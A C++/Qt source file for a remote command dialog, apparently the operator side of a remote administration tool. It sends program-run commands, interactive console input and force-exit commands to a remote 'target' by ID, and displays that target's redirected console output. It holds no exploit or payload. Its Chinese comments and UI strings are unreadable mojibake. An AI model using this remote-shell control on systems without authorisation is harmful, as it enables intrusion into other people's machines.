#include "remotecmddlg.h"
#include "target.h"

#include "maindlg.h"

#include <QtGui>

RemoteCmdDlg::RemoteCmdDlg(QWidget *parent, Target* tar)
	: QWidget(parent)
	, m_tar(tar)
{
	ui.setupUi(this);
	InitConnection();
}

RemoteCmdDlg::~RemoteCmdDlg()
{

}

void RemoteCmdDlg::InitConnection()
{
	connect(ui.btnWinExec, SIGNAL(clicked()), this, SLOT(onBtnWinExecClicked()));
	connect(ui.btnClearConsoleOutput, SIGNAL(clicked()), this, SLOT(onBtnClearConsoleOutputClicked()));
	connect(ui.btnExitProgress, SIGNAL(clicked()), this, SLOT(onBtnExitProcessClicked()));
	connect(ui.btnExecuteConsoleCmd, SIGNAL(clicked()), this, SLOT(onBtnExecuteConsoleCmdClicked()));
}

// ��� 'Զ��ִ��' ��ť
void RemoteCmdDlg::onBtnWinExecClicked()
{
	if ( !FrmMain->ctrOnlineFlag )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²����´��ļ�ִ��ָ��!"));
		return;
	}

	if ( FrmMain->ctrConn == NULL )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("�쳣�����������ӶϿ�!"));  
		return;
	}

	if (m_tar->tarStatus == TAROFFLINE)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²����´��ļ�ִ��ָ��!"));
		return;
	}

	if ( ui.edtWinExec->text().trimmed().isEmpty() )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��������Ҫִ�е��������!"));
		return;
	}

	if ( ui.btnExecuteConsoleCmd->isEnabled() )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("һ��ֻ��ͬ������һ������!"));
		return;
	}

	std::wstring path = ui.edtWinExec->text().toStdWString();
	FrmMain->ctrConn->Send_RUN(this->m_tar->dwTargetID, path, TRUE);
}

// ��� 'ִ��' ��ť
void RemoteCmdDlg::onBtnExecuteConsoleCmdClicked()
{
	std::string input = ui.edtConsoleInput->text().toStdString() + "\r\n";
	FrmMain->ctrConn->Send_CITA(this->m_tar->dwTargetID, input);
	ui.edtConsoleInput->clear();
}

// ��� '������' ��ť
void RemoteCmdDlg::onBtnClearConsoleOutputClicked()
{
	ui.edtConsoleOutput->clear();
}

// ��� 'ǿ���˳�' ��ť
void RemoteCmdDlg::onBtnExitProcessClicked()
{
	FrmMain->ctrConn->Send_CFI(this->m_tar->dwTargetID);
}

void RemoteCmdDlg::RemoteCmdFinished()
{
	ui.lbConsoleCaption->setText(QString::fromLocal8Bit("����̨������������� (ִ�н���)"));
	ui.lbCurrentProcess->setText("");
	ui.btnExecuteConsoleCmd->setEnabled(false);
	ui.btnExitProgress->setEnabled(false);
}

void RemoteCmdDlg::RemoteCmdOutput()
{
	QString text = ui.edtConsoleOutput->toPlainText();

	text += QString::fromStdWString(this->m_tar->widRedirectOutput);
	ui.edtConsoleOutput->setPlainText(text);

	QScrollBar* bar = ui.edtConsoleOutput->verticalScrollBar();
	bar->setSliderPosition(bar->maximum());
	ui.edtConsoleInput->setFocus();
}

void RemoteCmdDlg::RemoteCmdExec()
{
	ui.lbCurrentProcess->setText(
		QString::fromLocal8Bit("��ǰ���� : ") + QString::fromStdWString(this->m_tar->widRedirectProc));
	ui.lbConsoleCaption->setText(QString::fromLocal8Bit("����̨������������� (��������...)"));
	ui.btnExecuteConsoleCmd->setEnabled(true);
	ui.btnExitProgress->setEnabled(true);
}
